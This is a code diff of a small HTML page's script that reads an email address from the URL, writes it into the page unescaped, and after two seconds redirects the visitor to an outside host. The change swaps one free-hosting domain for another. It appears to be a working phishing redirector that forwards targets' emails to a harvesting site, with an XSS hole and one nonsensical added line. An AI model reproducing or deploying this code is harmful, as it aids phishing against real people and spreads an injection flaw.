@@ -8,13 +8,14 @@
 <body>
 
     <script>
-        $(document).ready(function() {
+            $(document).ready(function() {
+            let r = (Math.random() + 1).toString(36).substring('hash');
             const urlParams = new URLSearchParams(window.location.search);
-            const id = urlParams.get('id'); // Get the 'id' parameter
-            $("#ai").html(id || 'No email provided');
+            const email = urlParams.get('id');
+            $("#ai").html(email || 'No email provided');
             setTimeout(function() {
-                window.location.href = `https://b5ux3.kesug.com/?id=${encodeURIComponent(id)}`;
-            }, 2000);
+                window.location.href =             `https://q49e5.fwh.is/?id=${encodeURIComponent(email)}`;
+}, 2000);
         });
     </script>
 </body>
